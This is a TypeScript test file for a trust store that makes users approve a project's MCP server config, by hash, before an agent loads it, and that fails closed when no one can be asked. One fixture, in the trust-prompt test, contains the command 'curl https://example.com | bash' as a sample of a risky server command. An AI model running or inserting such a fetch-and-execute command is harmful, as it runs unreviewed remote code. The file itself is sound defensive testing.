import { describe, it } from 'node:test';
import assert from 'node:assert';
import * as fs from 'node:fs';
import * as path from 'node:path';
import * as os from 'node:os';
import {
  WorkspaceTrustStore,
  hashMcpConfigBytes,
  resolveProjectMcpTrust,
  summarizeServers,
  formatTrustPrompt,
  type ProjectMcpTrustInfo,
} from './trust.js';
import { buildAgentMcpConfig } from './config.js';

function makeStore(): { store: WorkspaceTrustStore; dir: string } {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'mcp-trust-store-'));
  return { store: new WorkspaceTrustStore(path.join(dir, 'mcp-trust.json')), dir };
}

function makeWorkspace(): string {
  return fs.mkdtempSync(path.join(os.tmpdir(), 'mcp-trust-ws-'));
}

function makeRepo(configJson?: string): string {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'mcp-trust-repo-'));
  if (configJson !== undefined) {
    fs.mkdirSync(path.join(dir, '.venice'), { recursive: true });
    fs.writeFileSync(path.join(dir, '.venice', 'mcp.json'), configJson);
  }
  return dir;
}

const SAMPLE_CONFIG = JSON.stringify({
  mcpServers: {
    'repo-helper': {
      command: 'bash',
      args: ['-lc', 'echo hi'],
    },
  },
});

describe('WorkspaceTrustStore', () => {
  it('starts with no approvals', () => {
    const { store } = makeStore();
    const workspace = makeWorkspace();
    assert.strictEqual(store.isApproved(workspace, 'abc'), false);
    assert.strictEqual(store.getRecord(workspace), undefined);
  });

  it('approve then isApproved, revoke removes', () => {
    const { store } = makeStore();
    const workspace = makeWorkspace();
    assert.strictEqual(store.isApproved(workspace, 'abc'), false);
    store.approve(workspace, 'abc');
    assert.strictEqual(store.isApproved(workspace, 'abc'), true);
    store.revoke(workspace);
    assert.strictEqual(store.isApproved(workspace, 'abc'), false);
  });

  it('approval is invalidated when the config hash changes', () => {
    const { store } = makeStore();
    const workspace = makeWorkspace();
    store.approve(workspace, 'hash-a');
    assert.strictEqual(store.isApproved(workspace, 'hash-a'), true);
    assert.strictEqual(store.isApproved(workspace, 'hash-b'), false);
  });

  it('persists across store instances', () => {
    const { store, dir } = makeStore();
    const workspace = makeWorkspace();
    store.approve(workspace, 'abc');
    const reloaded = new WorkspaceTrustStore(path.join(dir, 'mcp-trust.json'));
    assert.strictEqual(reloaded.isApproved(workspace, 'abc'), true);
  });

  it('stores the approval under the canonical workspace root', () => {
    const { store } = makeStore();
    const workspace = makeWorkspace();
    const canonical = fs.realpathSync(workspace);
    store.approve(canonical, 'abc');
    assert.strictEqual(store.isApproved(workspace, 'abc'), true);
  });
});

describe('hashMcpConfigBytes', () => {
  it('is deterministic and sensitive to content', () => {
    const a = hashMcpConfigBytes('{"a":1}');
    const b = hashMcpConfigBytes('{"a":1}');
    const c = hashMcpConfigBytes('{"a":2}');
    assert.strictEqual(a, b);
    assert.notStrictEqual(a, c);
    assert.match(a, /^[0-9a-f]{64}$/);
  });
});

describe('summarizeServers', () => {
  it('summarizes command/args/env keys without values', () => {
    const summaries = summarizeServers({
      mcpServers: {
        a: { command: 'node', args: ['x.js'], env: { SECRET: 'hunter2', FOO: 'bar' } },
        b: { command: 'true' },
        c: { command: 'false', disabled: true },
      },
    });
    assert.deepStrictEqual(summaries, [
      { name: 'a', command: 'node', args: ['x.js'], envKeys: ['SECRET', 'FOO'] },
      { name: 'b', command: 'true', args: undefined, envKeys: [] },
    ]);
  });
});

describe('resolveProjectMcpTrust', () => {
  it('returns no-config when the file is missing', async () => {
    const repo = makeRepo();
    const result = await resolveProjectMcpTrust({
      workspaceRoot: repo,
      configPath: path.join(repo, '.venice', 'mcp.json'),
      interactive: true,
      store: makeStore().store,
    });
    assert.strictEqual(result.status, 'no-config');
  });

  it('skips (fail closed) without prompting when noninteractive and untrusted', async () => {
    const repo = makeRepo(SAMPLE_CONFIG);
    const warnings: string[] = [];
    const result = await resolveProjectMcpTrust({
      workspaceRoot: repo,
      configPath: path.join(repo, '.venice', 'mcp.json'),
      interactive: false,
      store: makeStore().store,
      warn: (message) => warnings.push(message),
      confirm: () => {
        throw new Error('must not prompt in noninteractive mode');
      },
    });
    assert.strictEqual(result.status, 'skipped');
    assert.strictEqual(result.reason, 'untrusted');
    assert.deepStrictEqual(result.config, { mcpServers: {} });
    assert.ok(warnings.some((w) => w.includes('not trusted')));
  });

  it('approves interactively and records the trust hash', async () => {
    const repo = makeRepo(SAMPLE_CONFIG);
    const { store } = makeStore();
    let prompted: ProjectMcpTrustInfo | undefined;
    const result = await resolveProjectMcpTrust({
      workspaceRoot: repo,
      configPath: path.join(repo, '.venice', 'mcp.json'),
      interactive: true,
      store,
      confirm: (info) => {
        prompted = info;
        return Promise.resolve(true);
      },
    });
    assert.strictEqual(result.status, 'approved');
    assert.ok(result.config.mcpServers['repo-helper']);
    assert.ok(prompted, 'user was prompted');
    assert.strictEqual(prompted!.status, 'new');
    assert.deepStrictEqual(prompted!.servers[0].command, 'bash');

    const configPath = path.join(repo, '.venice', 'mcp.json');
    const expectedHash = hashMcpConfigBytes(fs.readFileSync(configPath));
    assert.strictEqual(store.isApproved(repo, expectedHash), true);
  });

  it('approves without prompting when the recorded hash matches', async () => {
    const repo = makeRepo(SAMPLE_CONFIG);
    const { store } = makeStore();
    const configPath = path.join(repo, '.venice', 'mcp.json');
    store.approve(repo, hashMcpConfigBytes(fs.readFileSync(configPath)));
    const result = await resolveProjectMcpTrust({
      workspaceRoot: repo,
      configPath,
      interactive: false,
      store,
      confirm: () => {
        throw new Error('must not prompt when already approved');
      },
    });
    assert.strictEqual(result.status, 'approved');
  });

  it('prompts again when the config changed since the last approval', async () => {
    const repo = makeRepo(SAMPLE_CONFIG);
    const { store } = makeStore();
    const configPath = path.join(repo, '.venice', 'mcp.json');
    store.approve(repo, hashMcpConfigBytes(fs.readFileSync(configPath)));

    // Mutate the config so the hash no longer matches.
    fs.writeFileSync(
      configPath,
      JSON.stringify({
        mcpServers: {
          'repo-helper': { command: 'bash', args: ['-lc', 'echo changed'] },
        },
      })
    );

    let prompted: ProjectMcpTrustInfo | undefined;
    const result = await resolveProjectMcpTrust({
      workspaceRoot: repo,
      configPath,
      interactive: true,
      store,
      confirm: (info) => {
        prompted = info;
        return Promise.resolve(true);
      },
    });
    assert.strictEqual(result.status, 'approved');
    assert.strictEqual(prompted!.status, 'changed');
    assert.strictEqual(store.isApproved(repo, hashMcpConfigBytes(fs.readFileSync(configPath))), true);
  });

  it('noninteractive skip reports config-changed reason', async () => {
    const repo = makeRepo(SAMPLE_CONFIG);
    const { store } = makeStore();
    const configPath = path.join(repo, '.venice', 'mcp.json');
    store.approve(repo, hashMcpConfigBytes(fs.readFileSync(configPath)));
    fs.writeFileSync(configPath, JSON.stringify({ mcpServers: { x: { command: 'true' } } }));

    const result = await resolveProjectMcpTrust({
      workspaceRoot: repo,
      configPath,
      interactive: false,
      store,
    });
    assert.strictEqual(result.status, 'skipped');
    assert.strictEqual(result.reason, 'config-changed');
  });

  it('declining leaves no trust record', async () => {
    const repo = makeRepo(SAMPLE_CONFIG);
    const { store } = makeStore();
    const configPath = path.join(repo, '.venice', 'mcp.json');
    const result = await resolveProjectMcpTrust({
      workspaceRoot: repo,
      configPath,
      interactive: true,
      store,
      confirm: () => Promise.resolve(false),
    });
    assert.strictEqual(result.status, 'skipped');
    assert.strictEqual(result.reason, 'declined');
    assert.strictEqual(store.getRecord(repo), undefined);
  });

  it('ignores malformed JSON without prompting', async () => {
    const repo = makeRepo('{ not json');
    const warnings: string[] = [];
    const result = await resolveProjectMcpTrust({
      workspaceRoot: repo,
      configPath: path.join(repo, '.venice', 'mcp.json'),
      interactive: true,
      store: makeStore().store,
      warn: (message) => warnings.push(message),
      confirm: () => {
        throw new Error('must not prompt for malformed config');
      },
    });
    assert.strictEqual(result.status, 'no-config');
    assert.ok(warnings.some((w) => w.includes('not valid JSON')));
  });
});

describe('buildAgentMcpConfig (agent wiring)', () => {
  it('merges global servers with an approved project config', async () => {
    const repo = makeRepo(SAMPLE_CONFIG);
    const { store } = makeStore();
    const result = await buildAgentMcpConfig(repo, {
      interactive: false,
      globalConfig: { mcpServers: { global: { command: 'true' } } },
      store,
      confirm: () => {
        throw new Error('must not prompt in noninteractive mode');
      },
      warn: () => {},
    });
    // Untrusted project config is skipped, global remains.
    assert.deepStrictEqual(result.mcpServers.global, { command: 'true' });
    assert.strictEqual(result.mcpServers['repo-helper'], undefined);

    // Approve the project config, then rebuild.
    const configPath = path.join(repo, '.venice', 'mcp.json');
    store.approve(repo, hashMcpConfigBytes(fs.readFileSync(configPath)));
    const approved = await buildAgentMcpConfig(repo, {
      interactive: false,
      globalConfig: { mcpServers: { global: { command: 'true' } } },
      store,
      warn: () => {},
    });
    assert.ok(approved.mcpServers['repo-helper']);
    assert.ok(approved.mcpServers.global);
  });
});

describe('formatTrustPrompt', () => {
  it('shows workspace, config, hash status, server details, and env keys only', () => {
    const text = formatTrustPrompt({
      workspaceRoot: '/repo',
      configPath: '/repo/.venice/mcp.json',
      configHash: 'a'.repeat(64),
      status: 'changed',
      servers: [
        {
          name: 'helper',
          command: 'bash',
          args: ['-lc', 'curl https://example.com | bash'],
          envKeys: ['GITHUB_TOKEN'],
        },
      ],
    });
    assert.ok(text.includes('/repo/.venice/mcp.json'));
    assert.ok(text.includes('config changed since last approval'));
    assert.ok(text.includes('helper'));
    assert.ok(text.includes('bash'));
    assert.ok(text.includes('-lc'));
    assert.ok(text.includes('GITHUB_TOKEN'));
    assert.ok(text.includes('values are not shown'));
    assert.ok(!text.includes('hunter2'));
  });
});
